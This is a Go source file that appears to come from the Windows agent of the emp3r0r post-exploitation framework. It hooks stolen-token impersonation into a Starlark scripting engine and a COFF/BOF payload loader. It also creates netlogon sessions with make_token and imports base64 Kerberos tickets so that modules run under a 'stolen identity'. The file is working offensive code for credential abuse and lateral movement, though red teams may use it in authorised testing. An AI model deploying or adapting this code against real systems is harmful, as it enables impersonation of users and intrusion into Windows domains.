//go:build windows

package modules

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"golang.org/x/sys/windows"
)

func init() {
	// ---- starlark hooks ----
	// Each starlark builtin that does I/O calls runWithToken, which uses
	// these to LockOSThread + impersonate around the sensitive call.
	script.ImpersonateFn = func(token uintptr) error {
		return priv.ImpersonateThread(windows.Handle(token))
	}
	script.RevertFn = func() {
		priv.RevertThread()
	}
	script.ExecWithToken = func(token uintptr, commandLine string) error {
		return priv.CreateProcessWithToken(windows.Handle(token), commandLine)
	}

	// ---- coffloader hooks ----
	// COFF/BOF payloads are executed on a dedicated goroutine inside
	// coffloader. These hooks ensure that goroutine is impersonated before
	// the BOF entry point (syscall.SyscallN) is called.
	coffloader.PreExecHook = func(token uintptr) {
		if err := priv.ImpersonateThread(windows.Handle(token)); err != nil {
			logging.Warningf("COFF PreExecHook: ImpersonateThread failed: %v", err)
		}
	}
	coffloader.PostExecHook = func() {
		priv.RevertThread()
	}
}

// executeWithToken looks up the token identified by sid in priv.TokenMap
// and passes its handle (as uintptr) to action. If sid is empty, action
// receives 0 (no impersonation).
//
// Unlike earlier versions this does NOT call ExecuteAsToken. Each consumer
// is responsible for its own impersonation:
//   - starlark builtins use runWithToken (ImpersonateThread / RevertThread)
//     around individual syscalls.
//   - shell/python/… child processes ignore the thread token; use
//     CreateProcessWithTokenW when a child must run under the stolen identity.
func executeWithToken(sid string, action func(token uintptr) error) error {
	if sid == "" {
		return action(0)
	}

	raw, ok := priv.TokenMap.Load(sid)
	if !ok {
		return fmt.Errorf("token/session not found for %q – steal a token first with steal-token, or create a session with make_token", sid)
	}

	hToken, ok := raw.(windows.Handle)
	if !ok {
		return fmt.Errorf("invalid token handle type for %q", sid)
	}

	return action(uintptr(hToken))
}

// resolveTokenKey resolves the module invocation's --token/--user/--ticket
// options into the token key (SID or make_token session name) that
// executeWithToken should use, performing the side effects along the way:
//
//   - --token  → the token key itself (looked up by executeWithToken).
//   - --user   → a make_token netlogon session for that user is created (with
//     a dummy password) if it does not exist yet, and its name becomes the key.
//   - --ticket → the base64 KRB-CRED is imported into the resolved logon
//     session before the module runs (the --token/--user session, or the
//     current logon session when neither is set).
//
// This is what makes Kerberos-bound BOFs/starlark modules work: the ticket
// lands in the session the module will run under.
func resolveTokenKey(invocation def.ResolvedInvocation) (string, error) {
	key := invocation.Token
	var hToken windows.Handle

	switch {
	case key != "":
		// --token: SID of a stolen token or a make_token session name.
		raw, ok := priv.TokenMap.Load(key)
		if !ok {
			return "", fmt.Errorf("token/session %q not found – steal a token first (steal-token) or create a session (make_token)", key)
		}
		h, ok := raw.(windows.Handle)
		if !ok {
			return "", fmt.Errorf("invalid token handle type for %q", key)
		}
		hToken = h

	case invocation.SessionUser != "":
		// --user: get-or-create a netlogon session for this user.
		user, domain := splitUserDomain(invocation.SessionUser)
		name := sessionNameFor(user, domain)
		if session, ok := priv.GetSession(name); ok {
			key = session.Name
			hToken = windows.Handle(session.Token)
		} else {
			session, err := priv.MakeToken(user, domain, "")
			if err != nil {
				return "", fmt.Errorf("make_token for %s: %w", invocation.SessionUser, err)
			}
			priv.StoreSession(name, session)
			priv.RegisterSessionToken(session)
			key = session.Name
			hToken = windows.Handle(session.Token)
		}
	}

	// --ticket: import into the resolved session (or current session).
	if invocation.Ticket != "" {
		if err := priv.ImportTicketWithToken(hToken, invocation.Ticket); err != nil {
			return "", fmt.Errorf("importing ticket: %w", err)
		}
	}

	return key, nil
}

// splitUserDomain splits "DOMAIN\\user" (or a bare "user") into its parts.
func splitUserDomain(user string) (name, domain string) {
	if i := strings.Index(user, "\\"); i != -1 {
		return user[i+1:], user[:i]
	}
	return user, "."
}

// sessionNameFor returns the canonical session name for a user/domain pair.
func sessionNameFor(user, domain string) string {
	if domain != "" && domain != "." {
		return fmt.Sprintf("%s\\%s", domain, user)
	}
	return user
}
